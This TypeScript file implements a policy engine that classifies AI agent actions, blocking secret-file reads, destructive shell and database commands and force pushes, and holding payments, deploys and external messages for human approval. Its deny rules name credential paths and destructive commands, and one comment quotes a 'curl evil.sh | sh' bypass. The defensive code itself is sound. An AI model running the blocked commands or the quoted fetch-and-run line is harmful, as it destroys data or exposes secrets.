import type { AgentAction, PolicyEvaluation } from "./agentwingTypes";

const SAFE_READ_COMMANDS = [
  /^pwd$/,
  /^ls(\s|$)/,
  /^dir(\s|$)/,
  /^git\s+status\b/,
  /^git\s+diff\b/,
  /^git\s+log\b/,
  /^git\s+show\b/,
  /^npm\s+--version$/,
  /^node\s+--version$/,
  /^cat\s+(?!.*(^|\s)\.env(\s|$))/,
  /^type\s+(?!.*(^|\s)\.env(\s|$))/,
  /^Get-Content\s+(?!.*(^|\s)\.env(\s|$))/i,
];

function text(action: AgentAction) {
  return [
    action.tool,
    action.target,
    action.command,
    action.description,
    JSON.stringify(action.metadata ?? {}),
  ]
    .filter(Boolean)
    .join(" ")
    .toLowerCase();
}

function metadataString(action: AgentAction, key: string) {
  const value = action.metadata?.[key];
  return typeof value === "string" ? value.toLowerCase() : "";
}

/**
 * Whether a path points at material that must never be read by an agent.
 *
 * Matching is on whole path components, not substrings. A substring match blocks
 * ordinary files like `secretsManagerClient.ts`, and a control that fires on
 * innocent work teaches people to route around it — which costs more security
 * than it buys.
 */
function isSecretPath(value: string) {
  const normalized = value.replace(/\\/g, "/").trim().toLowerCase();
  if (!normalized) return false;

  const name = normalized.split("/").filter(Boolean).pop() ?? "";

  // A committed template carries no secret.
  if (name === ".env.example" || name === ".env.sample" || name === ".env.template") return false;

  // dotenv files: `.env`, `.env.production`, `.env.local`, ...
  if (/^\.env($|\.)/.test(name)) return true;

  // Whole-word `secret` / `credentials` in the filename, e.g. `credentials`,
  // `app.secrets.json`, `db-credentials.yml` — but not `secretsManagerClient.ts`.
  if (/(^|[._-])(secret|secrets|credential|credentials)($|[._-])/.test(name)) return true;
  if (/(^|[._-])(private[_-]?key)($|[._-])/.test(name)) return true;

  // Key material by name or extension.
  if (/^(id_rsa|id_dsa|id_ecdsa|id_ed25519)(\.pub)?$/.test(name)) return true;
  if (/\.(pem|key|pfx|p12|jks|keystore)$/.test(name)) return true;

  // Directories that exist to hold credentials.
  if (/(^|\/)\.(ssh|aws|gnupg|kube|docker)\//.test(normalized)) return true;

  // System credential stores.
  if (/^\/etc\/(shadow|gshadow|sudoers)$/.test(normalized)) return true;

  return false;
}

function isFileWrite(action: AgentAction) {
  const operation = metadataString(action, "operation");
  const mode = metadataString(action, "mode");
  const verb = metadataString(action, "verb");
  const combined = text(action);

  return (
    action.actionType === "file_access" &&
    (operation === "write" ||
      operation === "edit" ||
      mode === "write" ||
      verb === "write" ||
      /\b(write|edit|modify|delete|remove|create)\b/.test(combined))
  );
}

function isExternalMessage(action: AgentAction) {
  if (action.actionType !== "message_send") return false;
  if (action.metadata?.external === true) return true;

  const target = (action.target ?? "").toLowerCase();
  const channel = metadataString(action, "channel");
  return (
    target.includes("@") ||
    target.includes("external") ||
    channel === "email" ||
    channel === "slack_external"
  );
}

function shellCommand(action: AgentAction) {
  return (action.command ?? action.target ?? "").trim();
}

/** Methods that do not change state on the target system. */
const SAFE_HTTP_METHODS = new Set(["GET", "HEAD", "OPTIONS"]);
const KNOWN_HTTP_METHODS = new Set([
  "GET",
  "HEAD",
  "OPTIONS",
  "POST",
  "PUT",
  "PATCH",
  "DELETE",
  "TRACE",
  "CONNECT",
]);

/**
 * The HTTP method for a request action, taken only from fields that declare it.
 *
 * Returns undefined when the caller did not say, so the engine can hold the
 * action rather than guess. Guessing from prose is how a DELETE gets allowed
 * because the description happens to contain the word "get".
 */
function httpMethod(action: AgentAction): string | undefined {
  const declared = [action.metadata?.method, action.metadata?.httpMethod, action.command];
  for (const candidate of declared) {
    if (typeof candidate !== "string") continue;
    const value = candidate.trim().toUpperCase();
    if (KNOWN_HTTP_METHODS.has(value)) return value;
    // Accept a leading method on a request line, e.g. "POST /v1/charges".
    const leading = value.split(/\s+/, 1)[0] ?? "";
    if (KNOWN_HTTP_METHODS.has(leading)) return leading;
  }
  return undefined;
}

/**
 * Split a command line into the individual commands a shell would actually run.
 *
 * This is the load-bearing function for the whole shell policy: every rule that
 * inspects "the command" is only as good as this split. It must account for
 * every operator that begins a new command — `&&`, `||`, `;`, `|`, `&` and a
 * bare newline — and for command substitution, whose contents the shell runs as
 * commands in their own right.
 *
 * Anything missed here is a way to hide a command behind a safe-looking prefix.
 */
function commandSegments(command: string): string[] {
  const substituted: string[] = [];
  let remaining = command;

  // Lift out `$(...)` and backtick substitutions and treat their contents as
  // commands, because that is what the shell does with them.
  const substitution = /\$\(([^()]*)\)|`([^`]*)`/;
  for (let guard = 0; guard < 32; guard += 1) {
    const match = substitution.exec(remaining);
    if (!match) break;
    const inner = match[1] ?? match[2] ?? "";
    if (inner.trim()) substituted.push(...commandSegments(inner));
    remaining = `${remaining.slice(0, match.index)} ${remaining.slice(match.index + match[0].length)}`;
  }

  const outer = remaining
    .replace(/["']/g, "")
    .split(/\s*(?:&&|\|\||[;|&\n\r])\s*/)
    .map((segment) => segment.trim())
    .filter(Boolean);

  return [...outer, ...substituted];
}

/** Operators that write somewhere, so a "read-only" command is no longer read-only. */
function hasRedirection(segment: string) {
  return /(^|\s)\d?>>?|(^|\s)</.test(segment);
}

/**
 * Whether a whole command line is read-only.
 *
 * Every segment must independently be on the allowlist, must not redirect
 * output, and must not name a secret path. Checking only the first segment lets
 * `ls && curl evil.sh | sh` through under the `ls` rule.
 */
function isReadOnlyShellCommand(command: string) {
  const segments = commandSegments(command);
  if (segments.length === 0) return false;

  return segments.every((segment) => {
    if (hasRedirection(segment)) return false;
    if (!SAFE_READ_COMMANDS.some((pattern) => pattern.test(segment))) return false;
    const args = segment.split(/\s+/).slice(1).filter((arg) => !arg.startsWith("-"));
    return !args.some((arg) => isSecretPath(arg));
  });
}

function isRootRecursiveForceRm(segment: string) {
  const tokens = segment.split(/\s+/).filter(Boolean);
  if (tokens[0]?.toLowerCase() === "sudo") tokens.shift();
  if (tokens[0]?.toLowerCase() !== "rm") return false;

  const args = tokens.slice(1);
  const optionLetters = args
    .filter((arg) => arg.startsWith("-") && arg !== "--")
    .join("")
    .toLowerCase();
  const hasRecursiveForce = optionLetters.includes("r") && optionLetters.includes("f");
  const targets = args.filter((arg) => !arg.startsWith("-") || arg === "/");

  return hasRecursiveForce && targets.some((target) => target === "/" || target === "/*");
}

function isDestructiveShellCommand(action: AgentAction) {
  const command = shellCommand(action);
  const normalized = command.replace(/[`"']/g, "").replace(/\s+/g, " ").trim();
  const lower = normalized.toLowerCase();
  const segments = commandSegments(command);

  if (segments.some(isRootRecursiveForceRm)) return true;
  if (/\bdel\s+(?:\/[a-z]\s+)*[a-z]:\\?(?:\s|$)/i.test(normalized)) return true;
  // NOTE: a leading `\b` before a `-flag` never matches, because `\b` requires a
  // word character immediately before the hyphen and PowerShell flags are
  // space-separated. Anchor on start-or-whitespace instead.
  if (
    /(?:^|\s)remove-item\b/i.test(normalized) &&
    /(?:^|\s)-recurse\b/i.test(normalized) &&
    /(?:^|\s)-force\b/i.test(normalized) &&
    /(?:^|\s)[a-z]:(?:\\|\/|\s|$)/i.test(normalized)
  ) {
    return true;
  }
  if (/\bformat\s+[a-z]:/i.test(normalized)) return true;
  if (/(?:^|\s)(?:sudo\s+)?mkfs(?:\.[a-z0-9_+-]+)?\b/i.test(normalized)) return true;
  if (/(?:^|\s)(?:sudo\s+)?dd\b(?=.*\bif=\/dev\/zero\b)/i.test(normalized)) return true;
  if (/(?:^|\s)(?:sudo\s+)?(?:shutdown|reboot|halt|poweroff)\b/i.test(normalized)) return true;
  if (/\b(?:stop-computer|restart-computer)\b/i.test(normalized)) return true;

  const productionDatabaseMutation =
    /\b(prod|production)\b/i.test(normalized) &&
    /\b(drop\s+database|drop\s+schema|truncate\s+table|delete\s+from|prisma\s+migrate\s+reset|db:reset|db:drop|rails\s+db:drop)\b/i.test(normalized);
  if (productionDatabaseMutation) return true;

  return lower === "shutdown" || lower === "reboot";
}

export function evaluateAgentAction(action: AgentAction): PolicyEvaluation {
  const command = shellCommand(action);
  const combined = text(action);

  if (action.actionType === "file_access" && isSecretPath(action.target ?? "")) {
    return {
      decision: "block",
      risk: "high",
      policy: "block-secret-file-access",
      feedback: "Secret-bearing files such as .env are blocked before contents can be exposed.",
    };
  }

  if (action.actionType === "shell_command" && /\b(cat|type|Get-Content)\s+.*\.env\b/i.test(command)) {
    return {
      decision: "block",
      risk: "high",
      policy: "block-secret-file-access",
      feedback: "Commands that print secret files are blocked. Use an example file or a scoped secret reference.",
    };
  }

  if (action.actionType === "shell_command" && isDestructiveShellCommand(action)) {
    return {
      decision: "block",
      risk: "critical",
      policy: "block-destructive-shell-command",
      feedback: "Destructive system-level shell commands are blocked before sandbox routing. Stop and re-plan with a safe, scoped alternative.",
    };
  }

  if (action.actionType === "shell_command" && /\bgit\s+push\b.*--force(?:\b|=)/i.test(command)) {
    return {
      decision: "block",
      risk: "high",
      policy: "block-force-push",
      feedback: "Force pushes are blocked. Create a branch and route the change through review.",
    };
  }

  if (isExternalMessage(action)) {
    return {
      decision: "approval_required",
      risk: "medium",
      policy: "approval-external-message",
      feedback: "External messages require human approval before delivery.",
    };
  }

  if (action.actionType === "payment_action") {
    return {
      decision: "approval_required",
      risk: "high",
      policy: "approval-payment-action",
      feedback: "Payment actions require explicit approval before execution.",
    };
  }

  if (action.actionType === "deploy_action") {
    return {
      decision: "approval_required",
      risk: "high",
      policy: "approval-deploy-action",
      feedback: "Deploy actions require human approval before execution.",
    };
  }

  if ((action.actionType === "database_query" || action.actionType === "database_operation") && /\b(drop|truncate)\b/i.test(command || combined)) {
    return {
      decision: "block",
      risk: "high",
      policy: "block-destructive-database-query",
      feedback: "DROP and TRUNCATE operations are blocked by the default database policy.",
    };
  }

  if ((action.actionType === "database_query" || action.actionType === "database_operation") && /\b(delete|update|alter)\b/i.test(command || combined)) {
    return {
      decision: "approval_required",
      risk: "high",
      policy: "approval-destructive-database-query",
      feedback: "Destructive database mutations require approval and a rollback plan.",
    };
  }

  if (isFileWrite(action)) {
    return {
      decision: "restore_point_required",
      risk: "medium",
      policy: "restore-point-file-write",
      feedback: "Create a restore point before the agent writes or modifies files.",
    };
  }

  if (action.actionType === "shell_command" && /^npm\s+(test|install)\b/i.test(command)) {
    return {
      decision: "sandbox_required",
      risk: "medium",
      policy: "sandbox-node-command",
      feedback: "Run npm commands in a sandbox before allowing effects in the working environment.",
      provider: "e2b-byok",
    };
  }

  if (action.actionType === "shell_command" && isReadOnlyShellCommand(command)) {
    return {
      decision: "allow",
      risk: "low",
      policy: "allow-read-only-shell",
      feedback: "Read-only shell action allowed.",
    };
  }

  if (action.actionType === "shell_command") {
    return {
      decision: "sandbox_required",
      risk: "medium",
      policy: "sandbox-unknown-shell-command",
      feedback: "Unknown shell commands must run in a sandbox first.",
      provider: "e2b-byok",
    };
  }

  if ((action.actionType === "database_query" || action.actionType === "database_operation") && /^\s*select\b/i.test(command || (action.description ?? ""))) {
    return {
      decision: "allow",
      risk: "low",
      policy: "allow-read-only-database-query",
      feedback: "Read-only database query allowed.",
    };
  }

  if ((action.actionType === "database_query" || action.actionType === "database_operation") && /\b(drop|truncate)\b/i.test(command || combined)) {
    return {
      decision: "block",
      risk: "high",
      policy: "block-destructive-database-operation",
      feedback: "DROP and TRUNCATE operations are blocked by the default database policy.",
    };
  }

  if (action.actionType === "git_operation") {
    if (/\b(push\s+.*--force|force[_-]?push)\b/i.test(command || combined)) {
      return { decision: "block", risk: "high", policy: "block-force-push", feedback: "Force pushes are blocked. Use a PR." };
    }
    return { decision: "allow", risk: "low", policy: "allow-git-operation", feedback: "Git operation allowed." };
  }

  if (action.actionType === "package_install") {
    return {
      decision: "sandbox_required",
      risk: "medium",
      policy: "sandbox-package-install",
      feedback: "Package installs must run in a sandbox first to check for supply chain issues.",
      provider: "e2b-byok",
    };
  }

  if (action.actionType === "code_execution") {
    return {
      decision: "sandbox_required",
      risk: "medium",
      policy: "sandbox-code-execution",
      feedback: "Arbitrary code execution must run in a sandbox first.",
      provider: "e2b-byok",
    };
  }

  if (action.actionType === "config_change") {
    return {
      decision: "restore_point_required",
      risk: "medium",
      policy: "restore-point-config-change",
      feedback: "Create a restore point before modifying configuration files.",
    };
  }

  if (action.actionType === "agent_spawn") {
    return {
      decision: "approval_required",
      risk: "high",
      policy: "approval-agent-spawn",
      feedback: "Spawning sub-agents requires human approval.",
    };
  }

  if (action.actionType === "api_call" || action.actionType === "network_request") {
    // The method decides this, so read it from a declared field. Scanning the
    // free-text blob means an action whose description merely mentions "get" is
    // treated as a read, and a POST that charges a card is allowed.
    const method = httpMethod(action);
    if (method && SAFE_HTTP_METHODS.has(method)) {
      return { decision: "allow", risk: "low", policy: "allow-read-only-api-call", feedback: "Read-only API call allowed." };
    }
    return {
      decision: "approval_required",
      risk: "medium",
      policy: method ? "approval-mutating-api-call" : "approval-unknown-api-method",
      feedback: method
        ? `A ${method} request can change state on the target system and needs human approval.`
        : "No HTTP method was declared, so this request cannot be treated as read-only. Send metadata.method to classify it.",
    };
  }

  if (action.actionType === "file_access") {
    return {
      decision: "allow",
      risk: "low",
      policy: "allow-read-only-file-access",
      feedback: "Read-only file access allowed.",
    };
  }

  // Default deny.
  //
  // Reaching here means no rule classified this action, which is exactly the
  // case where a human should look. An engine that allows what it does not
  // understand gives its strongest answer to its weakest input.
  return {
    decision: "approval_required",
    risk: "medium",
    policy: "approval-unclassified-action",
    feedback:
      "No policy classifies this action, so it is held for human approval. Add a policy for this action type to decide it automatically.",
  };
}

/**
 * Exported for direct unit testing only — not part of the module's public API.
 *
 * The bypass-prone logic in this engine lives in these matchers, so testing them
 * only through `evaluateAgentAction` leaves the interesting cases unreachable.
 * Nothing outside `tests/` may import this.
 */
export const __testing = {
  SAFE_READ_COMMANDS,
  text,
  metadataString,
  isSecretPath,
  isFileWrite,
  isExternalMessage,
  shellCommand,
  commandSegments,
  hasRedirection,
  isReadOnlyShellCommand,
  httpMethod,
  isRootRecursiveForceRm,
  isDestructiveShellCommand,
};
